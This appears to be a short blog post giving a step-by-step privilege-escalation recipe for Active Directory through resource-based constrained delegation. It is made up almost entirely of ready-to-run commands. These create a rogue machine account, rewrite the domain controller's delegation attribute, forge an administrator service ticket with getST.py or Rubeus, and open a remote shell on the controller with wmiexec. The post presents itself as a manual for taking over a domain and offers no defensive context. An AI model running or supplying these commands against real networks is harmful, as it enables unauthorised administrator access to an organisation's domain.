[back](/)

### Resource-based Constrained Delegation

Each domain user, by default, has permission to add 10 computers to the domain. This fact very often helps when you have GenericAll rights, for example from a user group to a domain controller. Here is a small manual for elevating privileges in a domain.

![Image](/img/rbcd/1.png)

First of all lets get dome useful tools:

```
git clone https://github.com/Kevin-Robertson/Powermad
git clone https://github.com/SecureAuthCorp/impacket
git clone https://github.com/GhostPack/Rubeus
wget  https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```

Step-by-step privesc:

```
import-module .\Powermad.ps1
New-MachineAccount -MachineAccount JAKI2 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

import-module .\PowerView.ps1
$ComputerSid = Get-DomainComputer JAKI2 -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

getST.py jaki.local/JAKI2 -dc-ip dc.jaki.local -impersonate administrator -spn www/dc.jaki.local
```

![Image](/img/rbcd/2.png)


```
export KRB5CCNAME=administrator.ccache

wmiexec.py dc.jaki.local -k

OR

execute-assembly /tmp/Rubeus.exe s4u /user:JAKI2 /rc4:32ed87bdb5fdc5e9cba88547376818d4 /impersonateuser:administrator /msdsspn:cifs/dc.jaki.local /ptt
```

![Image](/img/rbcd/3.png)

![Image](/img/rbcd/4.png)

```
cat /tmp/ticket_b64 | sed /^$/d | tr -d '\r\n' | sed -e "s/ //g" | base64 -d > /tmp/ticket

ticketConverter.py /tmp/ticket.kirbi admin.ccache 

export KRB5CCNAME=admin.ccache

wmiexec.py dc.jaki.local -k 
```


Useful links:

+ [PowerShellMafia](https://github.com/PowerShellMafia)
+ [Powermad](https://github.com/Kevin-Robertson/Powermad)
+ [Rubeus](https://github.com/GhostPack/Rubeus)
+ [Impacket](https://github.com/SecureAuthCorp/impacket)
+ [BloodHound](https://github.com/BloodHoundAD/BloodHound)

<div id="disqus_thread"></div>
<script>
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://hackitfaster-hopto-org.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

[back](/)